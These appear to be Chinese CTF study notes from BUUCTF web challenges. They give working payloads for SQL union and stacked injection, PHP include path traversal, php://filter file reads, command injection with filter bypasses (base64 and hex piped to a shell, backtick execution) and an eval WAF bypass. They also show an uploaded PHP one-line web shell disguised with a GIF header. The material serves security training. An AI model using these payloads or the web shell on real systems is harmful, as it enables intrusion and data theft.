1.sql注入
-

**sqllite**：
```
1' order by 2; 两列
```
```
1' union select 1,2;  注入点在第二列
```
![image](https://github.com/xhsy0314/Task/assets/84487619/eb055036-2882-4638-b338-405d6c2e1b38)

```
1' union select 1,group_concat(sql) from sqlite_master;
```
![image](https://github.com/xhsy0314/Task/assets/84487619/50ffb106-0610-46c8-a8e1-0b9ea4db5493)

```
-1' union select 1,group_concat(flaaag) from flaaaaa_aag;
```
![image](https://github.com/xhsy0314/Task/assets/84487619/67694d40-feb4-411a-8b83-9fc80e74ea8a)

**sql**：(例题：BUUCTF LoveSQL)
<br>
1.**查看注入类型**：输入1'报错You have an error in your SQL syntax;……，判断是字符注入
<br>
2.**确定列数**：

```
' union select 1,2,3;#
```
确定列数，2列时提示The used SELECT statements have a different number of columns，3列时提示success，说明列数为3列<br>

3.**确定数据库名**：
```
'union select 1,2,group_concat(schema_name) from information_schema.schemata;#
```
注意这里要用group_concat(schema_name)替代3，所以前面只写1,2即可，结果是： 'information_schema,mysql,performance_schema,test,geek' ，先测试一下geek
<br>
4.**确定数据表名**：
```
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek';#
```
结果是：'geekuser,l0ve1ysq1'
<br>
5.**确定表字段名**：
```
' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1';#
```
结果是：'id,username,password'
<br>
6.**确定字段内容**：
```
' union select 1,2,group_concat(username,password) from geek.l0ve1ysq1;# 
```
得到flag{aec2d854-1855-4168-be6f-3033aaa96c1a}
<br>
其他知识点：
        有时会过滤掉“or”“union”等等关键字，可以用到 **双写过滤** 来绕过
        例如：oorr uniunionon


2.php
-

```
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }
```

查看源码，有个hint.php访问一下<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/b4e0d62c-591b-4e42-ac93-24fd0e8ad0ac)
<br>
最底部的if语句为执行条件，有三个条件，第一个判断文件不能为空（检查是否传了file参数），第二这个传的参数是字符串，第三要过白名单检测，过了之后包含 隐藏了flag的文件。我们再看上面的if语句，白名单是hint.php，又有mb_strpos和mb_substr截取内容，碰到？就截止，所以我们只需要输入 source.php?file=source.php?即可绕过白名单检测，然后在输入../逐级跳转目录读取flag即可，可以一个一个试,多试几次则找到了flag<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/e62557ea-d228-4f27-a162-0d282f0cb135)
<br>
知识点:

* empty() 函数用于检查一个变量是否为空。
* empty() 判断一个变量是否被认为是空的。当一个变量并不存在，或者它 的值等同于 FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。
* empty() 5.5 版本之后支持表达式了，而不仅仅是变量。

* mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。
注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。

* mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置(即数字)

* .表示当前目录
* . .表示当前目录的上一级目录。
* . ./表示当前目录下的某个文件或文件夹，视后面跟着的名字而定
* ./表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。
* 例如：
        文件夹 a
        下面有 文件夹b c 和文件 d。
        文件夹b下面有e.php 和文件f。
        则e中的 . 表示 文件夹b
        ./f 表示b下面的文件f。
        . .表示a文件夹。
        . ./d 表示a文件夹下的d文件。

3.php伪协议
-


php支持的伪协议：
```
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```

1.php://filter:可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。<br>

```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```
利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。

而使用的convert.base64-encode，就是一种过滤器。

<br>

**例题**
<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/d63f1fcd-2401-48d9-9baf-632075c45976)
<br>

看到这样的格式和题目 include 也很容易想起文件包含和PHP伪协议。
所以，直接用伪协议读取flag.php的源码构造 payload
```
 ?file=php://filter/read=convert.base64-encode/resource=flag.php
```

4.过滤
-

已经通过127.0.0.1;ls 发现了两个文件<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/d621b093-2036-4318-9900-413f12d0d23b)

<br>

```
/?ip=1;cat index.php
```

发现过滤了空格。

```
/?ip=1;cat$IFS$1index.php
```
**知识点**：IFS在系统命令里是空格的意思，它的前后面加$是为了固定这个语句，不然和其他字符串行会出错，后面的$1是空字符，也可以写成${IFS}或${IFS}$9之类的，但{IFS}这个不行，因为{}被过滤了。
输入后获得index.php内容：

```
/?ip=
PING 1 (0.0.0.1): 56 data bytes
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}
?>
```
其中有四个if判断，
        第一个if中\x为十六进制字符开头
        第二个if匹配的是空格
        第三个if匹配的是bash，后面会讲到，这是其中一种解题方法
        第四个if匹配的是flag。.是匹配一个不是\n的字符，*是前一个匹配符匹配0到无数次。简单理解就是在一个字符串（就是我们要写的payload）里f,l,a,g这四个字符不能顺        序出现在任意位置。不管中间隔了什么，如果有a,l,g,f四个字符，他们连起来是flag，就会die("fxck your flag!");

**解法：**

1.转义
```
/?ip=1;a=ag;b=fl;cat$IFS$1$b$a.php
```

2.sh命令
```
/?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```
这里sh本来是bash，但bash被过滤用sh也行。它们都是shell，bash更好些，shell就是和系统交互的窗口，简单来说相当于编译器。|是管道符，意思为把|前的语句执行结果作为|后面的输入数据。Y2F0IGZsYWcucGhwbase64解码后就是cat flag.php。base64$IFS$1-d就是base64 -d,-d就是-decode解码。
整句就是echo Y2F0IGZsYWcucGhw|base64 -d|sh

3.内联执行
```
/?ip=1;cat$IFS$1`ls`
```
内联大概就是把反引号内执行后的内容作为我们的payload的一部分
ls执行后第一行就是flag.php


**知识点：**

1.空格绕过
        ${IFS}
        ${IFS}$1
        $IFS$1
        <和<>
        {cat,flag}
        %20替换
        %0a （换行）
        %0d （回车）
        %09 （tab）
        
2.黑名单(关键字）绕过

        单引号、双引号绕过：c"at"t fl''ag
        反斜线绕过：ca\t fl\ag
        和
        @绕过：c$1at fl$@ag
        拼接绕过：
                a=c;b=at;c=fl;d=ag; $a$b $c$d （不用加｜）
                /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php或者
                /?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php
        base64：
                echo "Y2F0IGZsYWc="|base64 -d
                echo "Y2F0IGZsYWc="|base64 -d|bash
                |echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
        hex编码绕过：
                echo "0x63617420666c61670a" | xxd -r -p|bash
        oct编码绕过：
                $(printf "\x63\x61\x74\x20\x66\x6c\x61\x67")
                {printf,"\x63\x61\x74\x20\x66\x6c\x61\x67"}|$0
3.内联绕过：
所谓内联绕过就是将反引号内命令的输出作为输入执行，比如系统对flag字符进行了过滤，那么我们可以通过ls命令将flag.php输出作为输入，有以下两种方式：

        ?ip=127.0.0.1;cat 'ls'
        ?ip=127.0.0.1;cat $(ls)

**例题（BUUCTF Easy Calc）**:<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/0da53229-6813-4b40-a7dd-a6ae429b515d)
<br>
进入题目，随便输入试试<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/b97f6466-32a9-4aa8-96eb-a06e2c7f76a8)
<br>
查看源码<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/7d9ea08a-13b4-4142-b0c2-9a917640e8fc)
<br>
发现存在一个calc.php，并且设置了waf，WAF会限制我们对num的输入，不能出现字母。进入这个calc文件看看。是一段php代码。
<br>
```
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```
对于WAF，通过在num和？间加一个空格就可以绕过：
```
/calc.php? num=......
```
接下来，我们需要从文件夹里找出flag，这就需要我们通过scandir()函数读取文件夹里的文件，再用print_r输出：
```
/calc.php? num=print_r(scandir("/"))
```
不过由于 / 被过滤了，因此得换种方法，可以尝试用<chr(对应ascii码值)>来替代
例如这里我们需要替换 / ，而 / 的ascii码值为47，所以可以采用：
```
/calc.php? num=print_r(scandir(chr(47)))
```

                scandir() 函数返回指定目录中的文件和目录的数组

```
Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1
```
得到返回的信息。
这样我们可以发现flag很有可能在“flagg”文件里
接下来读取文件，用file_get_contents()函数，同时不要忘记要转成用chr()表示的形式：
```
? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

                file_get_contents() :把整个文件读入一个字符串中。

得到flag

4.堆叠注入
-

```
1';show databases;#
1';show tables;#
```

****
        mysql中点引号( ' )和反勾号( ` )的区别
        linux下不区分，windows下区分
        区别:
        单引号( ' )或双引号主要用于字符串的引用符号
        eg：mysql> SELECT 'hello', "hello" ;
        
        反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]
        eg:`mysql>SELECT * FROM   `table`   WHERE `from` = 'abc' ;
        输入1'; show columns from `words`; # 字段使用的是反勾号（ ` ）
****

5.文件上传（例题：BUUCTF Knife）
-

进入题目环境可以上传文件。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/c7b95226-0c89-42d4-ba86-21c004fe7dad)
<br>

编写一句话木马上传
```
<script language='php'>eval($_POST['shell'];</script>
```
发现只让上传jpg png等图片。我们用shell.phtml的文件名直接上传，可以看到有一个前端检查，对文件后缀进行检查。接下来，我们将文件名改成shell.jpg进行上传。
然后又上传失败了，应该是在后端也对我们的文件内容进行了检测。接下来我们试着用**文件幻术头**的方式进行绕过。
```
GIF89a
<script language='php'>eval($_POST['shell'];</script>
```
发现能够绕过检测。此时重新上传，抓包，将文件后缀名改成phtml。<br>
<br>
上传成功之后，没有给我们具体的存储位置，我们猜测应该是存在/upload的路径之下，然后我们试着去访问文件。
<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/10a7aeb1-e3a9-4986-be4a-5e680fca4ed2)


<br>
成功访问。
接下来就可以用菜刀进行连接了。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/459348e5-0495-406c-908a-3cf5e427982a)

<br>
找到flag<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/c6d5f57a-4830-4a3b-a743-eb51049c0cb5)
